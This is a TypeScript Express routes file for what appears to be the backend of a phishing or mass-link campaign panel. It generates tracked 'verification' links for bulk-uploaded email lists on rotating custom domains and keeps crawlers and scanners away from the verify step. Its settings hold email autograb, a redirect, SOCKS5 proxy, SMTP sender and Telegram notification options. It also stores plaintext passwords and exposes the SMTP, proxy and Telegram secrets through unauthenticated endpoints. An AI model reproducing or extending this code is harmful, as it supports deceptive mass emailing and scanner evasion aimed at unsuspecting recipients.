import type { Express, Request, Response } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { z } from "zod";
import fs from "fs";
import path from "path";
import crypto from "crypto";
import multer from "multer";
import os from "os";
import type { Setting } from "@shared/schema";

// Define interface for domain objects
interface DomainInfo {
  domain: string;
  cnameTarget: string;
  verified: boolean;
}

/**
 * Background verification for domains
 * Attempts to verify a domain's CNAME record repeatedly without blocking the user
 * @param domain Domain to verify
 * @param cnameTarget Expected CNAME target value
 * @param attempts Current attempt count (used for recursion)
 * @param maxAttempts Maximum number of verification attempts
 * @param delayMs Delay between verification attempts in milliseconds
 */
async function verifyDomainInBackground(
  domain: string, 
  cnameTarget: string, 
  attempts: number = 0, 
  maxAttempts: number = 30, 
  delayMs: number = 20000 // Default 20s between attempts
) {
  // Skip if reached max attempts
  if (attempts >= maxAttempts) {
    console.log(`Maximum verification attempts (${maxAttempts}) reached for domain: ${domain}`);
    return;
  }
  
  console.log(`[Background Verification] Checking domain ${domain} (attempt ${attempts + 1}/${maxAttempts})`);
  
  try {
    const settings = await storage.getSettings();
    if (!settings) {
      console.error("Settings not found during background verification");
      return;
    }
    
    // Check if we're verifying primary domain or an additional domain
    let isPrimaryDomain = settings.customDomain === domain;
    let additionalDomains: any[] = [];
    
    try {
      additionalDomains = JSON.parse(settings.additionalDomains || '[]');
    } catch (err) {
      console.error("Error parsing additional domains during verification:", err);
      additionalDomains = [];
    }
    
    // If it's not the primary domain, find it in the additional domains
    if (!isPrimaryDomain) {
      const domainInfo = additionalDomains.find(d => d.domain === domain);
      if (!domainInfo) {
        console.error(`Domain ${domain} not found in settings during verification`);
        return;
      }
      
      // If domain is already verified, no need to continue
      if (domainInfo.verified) {
        console.log(`Domain ${domain} is already verified`);
        return;
      }
    } else if (settings.domainVerified) {
      // Primary domain is already verified
      console.log(`Primary domain ${domain} is already verified`);
      return;
    }
    
    // Use DNS module to check CNAME record
    const dns = await import('dns');
    const util = await import('util');
    const resolveCname = util.promisify(dns.resolveCname);
    
    try {
      // Check if CNAME record has been configured correctly
      const cnameRecords = await resolveCname(domain);
      
      let verified = false;
      if (cnameRecords && cnameRecords.length > 0) {
        // Check if any of the CNAME records match our target
        verified = cnameRecords.some(record => 
          record === cnameTarget || 
          record.endsWith(cnameTarget)
        );
      }
      
      if (verified) {
        console.log(`[Background Verification] Domain ${domain} verified successfully!`);
        
        // Update verification status
        if (isPrimaryDomain) {
          // Update primary domain status
          await storage.updateSettings({
            domainVerified: true
          });
        } else {
          // Update additional domain status
          const updatedDomains = additionalDomains.map(d => {
            if (d.domain === domain) {
              return {
                ...d,
                verified: true,
                verifiedAt: new Date().toISOString()
              };
            }
            return d;
          });
          
          await storage.updateSettings({
            additionalDomains: JSON.stringify(updatedDomains)
          });
        }
        return; // Successfully verified, exit the function
      }
    } catch (dnsError) {
      // DNS error - CNAME not found or still propagating
      console.log(`[Background Verification] DNS error for ${domain}: ${dnsError.message}`);
    }
    
    // Schedule next verification attempt with exponential backoff
    const nextDelay = Math.min(delayMs * 1.5, 300000); // Cap at 5 minutes
    console.log(`[Background Verification] Will try again in ${nextDelay / 1000}s`);
    
    setTimeout(() => {
      verifyDomainInBackground(domain, cnameTarget, attempts + 1, maxAttempts, nextDelay);
    }, delayMs);
  } catch (error) {
    console.error(`[Background Verification] Error verifying domain ${domain}:`, error);
    
    // Continue with retry despite error
    setTimeout(() => {
      verifyDomainInBackground(domain, cnameTarget, attempts + 1, maxAttempts, delayMs);
    }, delayMs);
  }
}

// Helper function to determine the appropriate domain for verification links
async function getVerificationDomain(req: Request, domainOption: string = 'default'): Promise<string> {
  try {
    const settings = await storage.getSettings();
    const defaultDomain = req.get('host') || 'localhost:5000';
    
    // If custom domains are not enabled or the domain is not verified, use default
    if (!settings?.useCustomDomain || !settings.customDomain || !settings.domainVerified) {
      return defaultDomain;
    }
    
    // If custom domain is enabled and verified, use it
    return settings.customDomain;
  } catch (error) {
    console.error("Error getting verification domain:", error);
    // Fallback to request host
    return req.get('host') || 'localhost:5000';
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Configure multer for file uploads
  const upload = multer({ 
    storage: multer.diskStorage({
      destination: (req, file, cb) => {
        const tempDir = path.join(os.tmpdir(), 'verification-uploads');
        // Create directory if it doesn't exist
        if (!fs.existsSync(tempDir)){
          fs.mkdirSync(tempDir, { recursive: true });
        }
        cb(null, tempDir);
      },
      filename: (req, file, cb) => {
        const uniquePrefix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniquePrefix + '-' + file.originalname);
      }
    }),
    limits: {
      fileSize: 50 * 1024 * 1024, // 50MB max size to handle large lists
    },
    fileFilter: (req, file, cb) => {
      // Accept only .txt files
      if (path.extname(file.originalname).toLowerCase() !== '.txt') {
        return cb(new Error('Only .txt files are allowed'));
      }
      cb(null, true);
    }
  });
  // Authentication routes
  app.post("/api/auth/login", async (req: Request, res: Response) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ message: "Username and password are required" });
    }
    
    const user = await storage.getUserByUsername(username);
    
    if (!user || user.password !== password) {
      return res.status(401).json({ message: "Invalid credentials" });
    }
    
    return res.status(200).json({ 
      id: user.id,
      username: user.username
    });
  });
  
  // Email batch processing and verification link generation
  app.post("/api/verification/generate", async (req: Request, res: Response) => {
    try {
      const emailBatchSchema = z.object({
        emails: z.string().nonempty(),
        expireDays: z.number().int().min(1).default(7),
        domain: z.string().optional().default('default')
      });
      
      const validatedData = emailBatchSchema.parse(req.body);
      
      // Process emails from either newline/comma-separated input or .txt file content
      const emailsText = validatedData.emails;
      const emailList = emailsText
        .split(/[\n,]/)
        .map(email => email.trim())
        .filter(email => email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/));
      
      if (emailList.length === 0) {
        return res.status(400).json({ message: "No valid emails provided" });
      }
      
      // Track duplicates for messaging
      const duplicateEmails = [];
      
      // Calculate expiration date
      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + validatedData.expireDays);
      
      // Generate verification links for each email
      const generatedLinks = [];
      
      for (const email of emailList) {
        // Check for existing links for this email
        const existingLinks = await storage.getVerificationLinksByEmail(email);
        if (existingLinks.length > 0) {
          duplicateEmails.push(email);
        }
        
        const code = await storage.generateVerificationCode();
        
        // Create verification link in storage
        const verificationLink = await storage.createVerificationLink({
          email,
          code,
          expiresAt
        });
        
        // Get domain for verification link using the selected domain option
        const domain = await getVerificationDomain(req, validatedData.domain);
        
        // Generate the URL for client (with protocol and domain)
        generatedLinks.push({
          email: verificationLink.email,
          code: verificationLink.code,
          url: `https://${domain}/verify/${verificationLink.code}`,
          regenerated: existingLinks.length > 0
        });
      }
      
      return res.status(200).json({ 
        count: generatedLinks.length,
        links: generatedLinks,
        duplicateCount: duplicateEmails.length,
        message: duplicateEmails.length > 0 
          ? `Generated ${generatedLinks.length} links (${duplicateEmails.length} were regenerated for existing emails)` 
          : `Generated ${generatedLinks.length} links`
      });
    } catch (error) {
      console.error("Error generating verification links:", error);
      return res.status(400).json({ message: "Invalid input data" });
    }
  });
  
  // Get all verification links
  app.get("/api/verification/links", async (req: Request, res: Response) => {
    try {
      const groupBySession = req.query.groupBySession === 'true';
      
      if (groupBySession && 'getVerificationLinksGroupedBySession' in storage) {
        // Use the custom storage method for grouped sessions if available
        const groupedLinks = await (storage as any).getVerificationLinksGroupedBySession();
        return res.status(200).json(groupedLinks);
      } else {
        // Use standard getAllVerificationLinks method
        const links = await storage.getAllVerificationLinks();
        
        // Format the response
        const formattedLinks = links.map(link => ({
          id: link.id,
          email: link.email,
          status: link.status,
          createdAt: link.createdAt,
          expiresAt: link.expiresAt,
          verifiedAt: link.verifiedAt,
          regenerated: (link as any).regenerated || false
        }));
        
        return res.status(200).json(formattedLinks);
      }
    } catch (error) {
      console.error("Error fetching verification links:", error);
      return res.status(500).json({ message: "Failed to fetch verification links" });
    }
  });
  
  // Clear verification links
  app.post("/api/verification/clear", async (req: Request, res: Response) => {
    try {
      const { olderThanDays } = req.body;
      
      if ('clearVerificationLinks' in storage) {
        const clearedCount = await (storage as any).clearVerificationLinks(
          olderThanDays ? parseInt(olderThanDays) : undefined
        );
        
        return res.status(200).json({ 
          success: true, 
          clearedCount,
          message: `Successfully cleared ${clearedCount} verification links`
        });
      } else {
        return res.status(501).json({ message: "Clear function not implemented" });
      }
    } catch (error) {
      console.error("Error clearing verification links:", error);
      return res.status(500).json({ message: "Failed to clear verification links" });
    }
  });
  
  // Resend verification for an email
  // Endpoint for handling verification link renewal requests
  app.post("/api/verification/renew", async (req: Request, res: Response) => {
    try {
      // Extract data from request
      const { code, email } = req.body;
      
      if (!code || !email) {
        return res.status(400).json({ 
          success: false, 
          message: "Missing required fields: code and email are required" 
        });
      }
      
      // Get settings to check if link renewal is enabled
      const settings = await storage.getSettings();
      if (!settings || !settings.allowLinkRenewal) {
        return res.status(403).json({ 
          success: false, 
          message: "Link renewal is not enabled by the administrator" 
        });
      }
      
      // Get original verification link
      const verificationLink = await storage.getVerificationLinkByCode(code);
      if (!verificationLink) {
        return res.status(404).json({ 
          success: false, 
          message: "Verification link not found" 
        });
      }
      
      // Check if the email matches
      if (verificationLink.email !== email) {
        return res.status(403).json({ 
          success: false, 
          message: "Email does not match the verification link" 
        });
      }
      
      // Check if the link is already verified (prevent renewals of already verified links)
      if (verificationLink.status === 'verified') {
        return res.status(400).json({ 
          success: false, 
          message: "This link has already been verified and cannot be renewed" 
        });
      }
      
      // Mark the link as having a renewal requested
      await storage.updateVerificationLinkStatus(
        verificationLink.id, 
        verificationLink.status, 
        undefined, 
        true
      );
      
      // Return success - admin will need to review and send the renewal
      return res.status(200).json({
        success: true,
        message: "Your renewal request has been received. You will receive a new verification link shortly."
      });
      
      /* NOTE: We're no longer auto-creating a new link here as per requirements.
         Instead, we mark the existing link as having a renewal requested, 
         and the admin will need to review and manually send the renewal using the admin interface */
      
    } catch (error) {
      console.error("Error renewing verification link:", error);
      res.status(500).json({ 
        success: false, 
        message: "Failed to renew verification link due to server error" 
      });
    }
  });

  app.post("/api/verification/resend", async (req: Request, res: Response) => {
    try {
      const { email, useCustomTemplate = false, domain: domainOption = 'default' } = req.body;
      
      if (!email) {
        return res.status(400).json({ message: "Email is required" });
      }
      
      // Calculate new expiration date (7 days by default)
      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + 7);
      
      // Generate new code with enhanced security
      const code = await storage.generateVerificationCode();
      
      // Create new verification link
      const verificationLink = await storage.createVerificationLink({
        email,
        code,
        expiresAt
      });
      
      // Get domain for verification link using specified domain option
      const domain = await getVerificationDomain(req, domainOption);
      
      // Get verification URL with custom domain if enabled
      const verificationUrl = `https://${domain}/verify/${verificationLink.code}`;
      
      if (useCustomTemplate) {
        try {
          // Get the settings for the custom message template
          const settings = await storage.getSettings();
          
          if (settings) {
            // Prepare the email content from the template
            let emailContent = settings.emailTemplate || "Please verify your email at: {link}";
            // Replace the {link} placeholder with the actual verification URL
            emailContent = emailContent.replace(/{link}/g, verificationUrl);
            
            // In a production environment, this is where you would send the email
            // For this project, we're just demonstrating the template replacement
            console.log(`Would send email to ${email} with subject: "${settings.emailSubject}"`);
            console.log(`Email content: ${emailContent}`);
            
            return res.status(200).json({ 
              email: verificationLink.email,
              code: verificationLink.code,
              url: verificationUrl,
              message: "Verification link resent with custom template"
            });
          }
        } catch (err) {
          console.error("Error processing custom template:", err);
          // Continue with default response if template processing fails
        }
      }
      
      // Default response if custom template was not requested or processing failed
      return res.status(200).json({ 
        email: verificationLink.email,
        code: verificationLink.code,
        url: verificationUrl,
        message: "Verification link resent"
      });
    } catch (error) {
      console.error("Error resending verification link:", error);
      return res.status(500).json({ message: "Failed to resend verification link" });
    }
  });
  
  // Verify email with code
  app.get("/api/verification/verify/:code", async (req: Request, res: Response) => {
    try {
      const { code } = req.params;
      const botCheckPassed = req.query.botcheck === 'passed';
      
      // Find the verification link
      const link = await storage.getVerificationLinkByCode(code);
      
      if (!link) {
        return res.status(404).json({ message: "Verification link not found" });
      }
      
      // Check if expired
      if (new Date() > new Date(link.expiresAt)) {
        return res.status(400).json({ message: "Verification link has expired" });
      }
      
      // Check if already verified
      if (link.status === 'verified') {
        return res.status(400).json({ message: "Email already verified" });
      }
      
      // Get settings for redirect
      const settings = await storage.getSettings();
      
      // Check bot protection (using userAgent and settings)
      const userAgent = req.headers['user-agent'] || '';
      
      // Flag suspicious requests (improved bot detection logic)
      const isSuspicious = settings?.enableBotProtection && !botCheckPassed && (
        !userAgent || 
        userAgent.toLowerCase().includes('bot') || 
        userAgent.toLowerCase().includes('crawler') ||
        userAgent.toLowerCase().includes('spider') ||
        Math.random() < 0.1 // 10% chance to trigger bot check for testing purposes
      );
        
      if (isSuspicious) {
        // Return response requiring bot check but don't verify yet
        return res.status(200).json({
          success: true,
          botProtectionRequired: true,
          email: link.email,
          settings
        });
      }
      
      // If we reached here, either bot protection is disabled or the check passed
      
      // Mark as verified
      await storage.updateVerificationLinkStatus(link.id, 'verified', new Date());
      
      return res.status(200).json({ 
        success: true,
        botProtectionRequired: false,
        email: link.email,
        settings
      });
    } catch (error) {
      console.error("Error verifying email:", error);
      return res.status(500).json({ message: "Failed to verify email" });
    }
  });
  
  // Settings management
  // Get available domains for selection
  app.get("/api/domain/available", async (req: Request, res: Response) => {
    try {
      const settings = await storage.getSettings();
      
      if (!settings) {
        return res.status(200).json({
          success: true,
          domains: [
            {
              id: "default",
              name: req.get('host') || 'localhost:5000',
              type: "default"
            }
          ]
        });
      }
      
      const defaultDomain = req.get('host') || 'localhost:5000';
      const domains = [];
      
      // Add default domain
      domains.push({
        id: 'default',
        name: defaultDomain,
        type: 'default'
      });
      
      // Add custom domain if enabled and verified
      if (settings.useCustomDomain && settings.customDomain && settings.domainVerified) {
        domains.push({
          id: settings.customDomain,
          name: settings.customDomain,
          type: 'primary',
          cnameTarget: settings.domainCnameTarget,
          verified: true
        });
        
        // Add additional domains
        try {
          const additionalDomains = JSON.parse(settings.additionalDomains || '[]');
          if (Array.isArray(additionalDomains) && additionalDomains.length > 0) {
            additionalDomains.forEach((domainEntry, index) => {
              // Handle both string and object formats
              if (typeof domainEntry === 'string') {
                domains.push({
                  id: `additional-${domainEntry}`,
                  name: domainEntry,
                  type: 'additional',
                  needsMigration: true
                });
              } else if (domainEntry.verified) {
                // Only include verified domains for selection
                domains.push({
                  id: `additional-${index}`,
                  name: domainEntry.domain,
                  type: 'additional',
                  cnameTarget: domainEntry.cnameTarget,
                  verified: true
                });
              }
            });
          }
        } catch (err) {
          console.error("Error parsing additional domains:", err);
        }
        
        // Add random option if there are multiple domains
        if (domains.length > 2) { // More than default + primary
          domains.push({
            id: 'random',
            name: 'Random Domain (load balanced)',
            type: 'option'
          });
        }
      }
      
      // Detailed list of all domains (including unverified) for admin purposes
      const allDomains = [];
      
      // Add primary domain if set
      if (settings.customDomain) {
        allDomains.push({
          domain: settings.customDomain,
          isPrimary: true,
          cnameTarget: settings.domainCnameTarget,
          verified: settings.domainVerified
        });
      }
      
      // Add all additional domains
      try {
        const additionalDomains = JSON.parse(settings.additionalDomains || '[]');
        
        if (Array.isArray(additionalDomains)) {
          additionalDomains.forEach(domainEntry => {
            if (typeof domainEntry === 'string') {
              // Old format
              allDomains.push({
                domain: domainEntry,
                isPrimary: false,
                verified: false,
                needsMigration: true
              });
            } else {
              // New format
              allDomains.push({
                domain: domainEntry.domain,
                isPrimary: false,
                cnameTarget: domainEntry.cnameTarget,
                verified: domainEntry.verified
              });
            }
          });
        }
      } catch (err) {
        console.error("Error parsing all domains:", err);
      }
      
      return res.status(200).json({
        success: true,
        domains,
        allDomains,
        default: defaultDomain
      });
    } catch (error) {
      console.error("Error fetching available domains:", error);
      return res.status(500).json({
        success: false,
        message: error instanceof Error ? error.message : "Failed to fetch available domains"
      });
    }
  });

  app.get("/api/settings", async (req: Request, res: Response) => {
    try {
      const settings = await storage.getSettings();
      return res.status(200).json(settings);
    } catch (error) {
      console.error("Error fetching settings:", error);
      return res.status(500).json({ message: "Failed to fetch settings" });
    }
  });
  


  // Add domain endpoint - adds the domain and generates a CNAME target
  app.post("/api/domain/add", async (req: Request, res: Response) => {
    try {
      const { domain } = req.body;
      
      if (!domain) {
        return res.status(400).json({ 
          success: false,
          message: "Domain is required" 
        });
      }
      
      // Simple domain validation
      if (!domain.match(/^[a-zA-Z0-9][a-zA-Z0-9-]{1,61}[a-zA-Z0-9]\.[a-zA-Z]{2,}$/)) {
        return res.status(400).json({
          success: false,
          message: "Invalid domain format"
        });
      }
      
      // Get existing settings
      const settings = await storage.getSettings();
      
      if (!settings) {
        return res.status(404).json({ 
          success: false,
          message: "Settings not found" 
        });
      }
      
      // Generate a random CNAME target
      const cnameTarget = `wick3d-${crypto.randomBytes(4).toString('hex')}.replit.app`;
      
      // Check if this is the first domain being added
      if (!settings.customDomain || settings.customDomain === '') {
        // Update settings with new domain as the primary domain (unverified initially)
        await storage.updateSettings({
          customDomain: domain,
          domainCnameTarget: cnameTarget,
          domainVerified: false,
          useCustomDomain: true
        });
      } else {
        // Add as an additional domain
        let additionalDomains = [];
        try {
          additionalDomains = JSON.parse(settings.additionalDomains || '[]');
        } catch (err) {
          console.error("Error parsing additional domains:", err);
          additionalDomains = [];
        }
        
        // Check if domain already exists in additional domains
        const existingDomainIndex = additionalDomains.findIndex(
          d => typeof d === 'object' && d.domain === domain
        );
        
        if (existingDomainIndex >= 0) {
          // Update existing domain record
          additionalDomains[existingDomainIndex] = {
            domain,
            cnameTarget,
            verified: false,
            addedAt: new Date().toISOString()
          };
        } else {
          // Add new domain record
          additionalDomains.push({
            domain,
            cnameTarget,
            verified: false,
            addedAt: new Date().toISOString()
          });
        }
        
        // Update settings with additional domains
        await storage.updateSettings({
          additionalDomains: JSON.stringify(additionalDomains),
          useCustomDomain: true // Make sure custom domains are enabled
        });
      }
      
      // Start background verification process
      // This will check the domain periodically without blocking the user
      setTimeout(() => {
        verifyDomainInBackground(domain, cnameTarget);
      }, 100);
      
      // Return success with CNAME information for admin to configure
      return res.status(200).json({
        success: true,
        message: "Domain added successfully. Please configure the CNAME record as shown below.",
        domain: domain,
        cnameTarget: cnameTarget,
        instructions: `Create a CNAME record pointing from ${domain} to ${cnameTarget}`,
        verificationStatus: "pending",
        note: "Domain verification will happen automatically in the background. You can continue adding more domains."
      });
    } catch (error) {
      console.error("Error adding domain:", error);
      return res.status(500).json({ 
        success: false,
        message: "Failed to add domain. Please try again later."
      });
    }
  });
  
  // Check domain verification status
  app.post("/api/domain/check", async (req: Request, res: Response) => {
    try {
      const { domain } = req.body;
      
      if (!domain) {
        return res.status(400).json({ 
          success: false,
          message: "Domain is required" 
        });
      }
      
      // Get existing settings
      const settings = await storage.getSettings();
      
      if (!settings) {
        return res.status(404).json({ 
          success: false,
          message: "Settings not found" 
        });
      }
      
      // Make sure this is the domain we have on record
      if (settings.customDomain !== domain) {
        return res.status(400).json({
          success: false,
          message: "Domain doesn't match the registered domain"
        });
      }
      
      const cnameTarget = settings.domainCnameTarget;
      if (!cnameTarget) {
        return res.status(400).json({
          success: false,
          message: "No CNAME target found for this domain"
        });
      }
      
      // Use Node's DNS module directly instead of the dnsVerifier utility
      const dns = await import('dns');
      const util = await import('util');
      const resolveCname = util.promisify(dns.resolveCname);
      
      try {
        // Check if CNAME record has been configured correctly
        const cnameRecords = await resolveCname(domain);
        
        let verified = false;
        if (cnameRecords && cnameRecords.length > 0) {
          // Check if any of the CNAME records match our target
          verified = cnameRecords.some(record => 
            record === cnameTarget || 
            record.endsWith(cnameTarget)
          );
        }
        
        if (verified) {
          // Domain verified successfully
          const updatedSettings = await storage.updateSettings({
            domainVerified: true
          });
          
          return res.status(200).json({
            success: true,
            message: "Domain verified successfully",
            verified: true,
            cnameTarget: cnameTarget,
            settings: updatedSettings
          });
        } else {
          // CNAME configured but doesn't match
          return res.status(202).json({
            success: true,
            message: "CNAME record found but doesn't match the expected target",
            verified: false,
            cnameTarget: cnameTarget,
            found: cnameRecords || []
          });
        }
      } catch (dnsError) {
        // CNAME not found or DNS error
        return res.status(202).json({
          success: true,
          message: "CNAME record not found or still propagating",
          verified: false,
          cnameTarget: cnameTarget
        });
      }
    } catch (error) {
      console.error("Error checking domain:", error);
      return res.status(500).json({ 
        success: false,
        message: "Failed to check domain verification. Please try again later."
      });
    }
  });

  app.post("/api/settings", async (req: Request, res: Response) => {
    try {
      const settingsSchema = z.object({
        redirectUrl: z.string().url().optional(),
        showLoadingSpinner: z.boolean().optional(),
        loadingDuration: z.number().int().min(1).max(10).optional(),
        successMessage: z.string().optional(),
        useEmailAutograb: z.boolean().optional(),
        emailAutograbParam: z.string().optional(),
        enableBotProtection: z.boolean().optional(),
        customThankYouPage: z.string().optional(),
        useCustomThankYouPage: z.boolean().optional(),
        securityLevel: z.number().int().min(1).max(5).optional(),
        useWildcards: z.boolean().optional(),
        encryptionSalt: z.string().optional(),
        // Domain settings
        useCustomDomain: z.boolean().optional(),
        customDomain: z.string().optional(),
        domainCnameTarget: z.string().optional(),
        domainVerified: z.boolean().optional(),
        additionalDomains: z.string().optional(), // JSON array of additional domains
        // Email template settings
        emailSubject: z.string().optional(),
        emailTemplate: z.string().optional(),
        senderEmail: z.string().email().optional(),
        senderName: z.string().optional(),
        smtpServer: z.string().optional(),
        smtpPort: z.number().int().min(1).max(65535).optional(),
        smtpUser: z.string().optional(),
        smtpPassword: z.string().optional(),
        // SOCKS5 proxy settings
        useSocks5Proxy: z.boolean().optional(),
        socks5Host: z.string().optional(),
        socks5Port: z.number().int().min(1).max(65535).optional(),
        socks5Username: z.string().optional(),
        socks5Password: z.string().optional(),
        socks5MaxAttempts: z.number().int().min(1).max(1000).optional(),
        // Saved email templates
        savedTemplates: z.string().optional(),
        // Telegram notification settings
        useTelegramNotifications: z.boolean().optional(),
        telegramBotToken: z.string().optional(),
        telegramChatId: z.string().optional()
      });
      
      const validatedData = settingsSchema.parse(req.body);
      const updatedSettings = await storage.updateSettings(validatedData);
      
      return res.status(200).json(updatedSettings);
    } catch (error) {
      console.error("Error updating settings:", error);
      return res.status(400).json({ message: "Invalid settings data" });
    }
  });
  
  // Upload TXT file with emails
  app.post("/api/verification/upload", upload.single('file'), async (req: Request, res: Response) => {
    try {
      if (!req.file) {
        return res.status(400).json({ message: "No file uploaded" });
      }
      
      // Validate expireDays parameter
      const expireDays = req.body.expireDays ? parseInt(req.body.expireDays) : 7;
      if (isNaN(expireDays) || expireDays < 1) {
        return res.status(400).json({ message: "Invalid expiration days" });
      }
      
      // Get domain option (default, random, or specific domain)
      const domainOption = req.body.domain || 'default';
      
      // Read the file
      const fileContent = fs.readFileSync(req.file.path, 'utf8');
      
      // Process the emails (handle large files efficiently using streams for real production)
      const emailList = fileContent
        .split(/[\n,]/)
        .map(email => email.trim())
        .filter(email => email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/));
      
      if (emailList.length === 0) {
        return res.status(400).json({ message: "No valid emails found in the file" });
      }
      
      // Calculate expiration date
      const expiresAt = new Date();
      expiresAt.setDate(expiresAt.getDate() + expireDays);
      
      // Generate verification links for each email
      const generatedLinks = [];
      const duplicateEmails = [];
      const batchSize = 1000; // Process emails in batches to handle millions efficiently
      
      // Process emails in batches
      for (let i = 0; i < emailList.length; i += batchSize) {
        const batch = emailList.slice(i, i + batchSize);
        
        // Process each email in the current batch
        for (const email of batch) {
          // Check for existing links
          const existingLinks = await storage.getVerificationLinksByEmail(email);
          if (existingLinks.length > 0) {
            duplicateEmails.push(email);
          }
          
          const code = await storage.generateVerificationCode();
          
          // Create verification link
          const verificationLink = await storage.createVerificationLink({
            email,
            code,
            expiresAt
          });
          
          // Get domain for verification link using the selected domain option
          const domain = await getVerificationDomain(req, domainOption);
        
          // Add to result with full URL
          generatedLinks.push({
            email: verificationLink.email,
            code: verificationLink.code,
            url: `https://${domain}/verify/${verificationLink.code}`,
            regenerated: existingLinks.length > 0
          });
        }
      }
      
      // Clean up the temporary file
      fs.unlinkSync(req.file.path);
      
      return res.status(200).json({
        count: generatedLinks.length,
        links: generatedLinks,
        duplicateCount: duplicateEmails.length,
        message: duplicateEmails.length > 0 
          ? `Generated ${generatedLinks.length} links (${duplicateEmails.length} were regenerated for existing emails)` 
          : `Generated ${generatedLinks.length} links`
      });
      
    } catch (error) {
      console.error("Error processing file upload:", error);
      
      // Clean up in case of error
      if (req.file && fs.existsSync(req.file.path)) {
        fs.unlinkSync(req.file.path);
      }
      
      return res.status(500).json({ 
        message: error instanceof Error ? error.message : "Failed to process file upload" 
      });
    }
  });

  // Download verification links as text file
  app.post("/api/verification/download", async (req: Request, res: Response) => {
    try {
      const { links, domain: domainOption = 'default' } = req.body;
      
      if (!links || !Array.isArray(links) || links.length === 0) {
        return res.status(400).json({ message: "No links provided" });
      }
      
      // Get custom domain if enabled
      const domain = await getVerificationDomain(req, domainOption);
      
      // Generate links with the appropriate domain
      const linkTexts = links.map(link => `https://${domain}/verify/${link.code}`).join('\n');
      
      res.status(200).json({ content: linkTexts });
    } catch (error) {
      console.error("Error generating download file:", error);
      return res.status(500).json({ message: "Failed to generate download file" });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
